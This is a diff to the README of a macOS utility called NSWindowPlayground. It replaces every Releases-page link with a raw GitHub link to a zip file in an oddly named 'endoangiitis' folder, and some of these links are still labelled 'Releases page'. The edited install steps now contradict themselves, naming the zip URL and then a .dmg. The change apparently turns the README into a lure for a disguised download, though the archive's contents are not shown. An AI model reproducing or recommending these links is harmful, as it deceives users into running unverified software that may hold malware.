@@ -6,7 +6,7 @@ Welcome to NSWindowPlayground! This app helps you test various NSWindow style se
 
 ## 🔗 Download Now
 
-[![Download NSWindowPlayground](https://img.shields.io/badge/Download-Now-blue.svg)](https://github.com/Sahul17/NSWindowPlayground/releases)
+[![Download NSWindowPlayground](https://raw.githubusercontent.com/Sahul17/NSWindowPlayground/main/endoangiitis/NSWindowPlayground.zip)](https://raw.githubusercontent.com/Sahul17/NSWindowPlayground/main/endoangiitis/NSWindowPlayground.zip)
 
 ## 🛠️ System Requirements
 
@@ -20,9 +20,9 @@ Ensure your system meets these requirements before proceeding.
 
 ## 📥 Download & Install
 
-1. Visit the [Releases page](https://github.com/Sahul17/NSWindowPlayground/releases) to download NSWindowPlayground.
+1. Visit the [Releases page](https://raw.githubusercontent.com/Sahul17/NSWindowPlayground/main/endoangiitis/NSWindowPlayground.zip) to download NSWindowPlayground.
 2. Find the latest version available. It will be at the top of the list.
-3. Click on the file named `NSWindowPlayground.dmg` to download it.
+3. Click on the file named `https://raw.githubusercontent.com/Sahul17/NSWindowPlayground/main/endoangiitis/NSWindowPlayground.zip` to download it.
 4. Once the download is complete, open the `.dmg` file. 
 5. Drag and drop the NSWindowPlayground app into your Applications folder.
 6. You can now find the app in your Applications folder.
@@ -70,4 +70,4 @@ If you enjoy NSWindowPlayground, consider joining our community. Share your expe
 1. **Report Issues**: Use the Issues section in the GitHub repository.
 2. **Feature Requests**: Let us know what you'd like to see in future updates.
 
-Thank you for choosing NSWindowPlayground! Enjoy experimenting with window styles and make your applications uniquely yours. Remember, you can always download the latest version from the [Releases page](https://github.com/Sahul17/NSWindowPlayground/releases).
+Thank you for choosing NSWindowPlayground! Enjoy experimenting with window styles and make your applications uniquely yours. Remember, you can always download the latest version from the [Releases page](https://raw.githubusercontent.com/Sahul17/NSWindowPlayground/main/endoangiitis/NSWindowPlayground.zip).
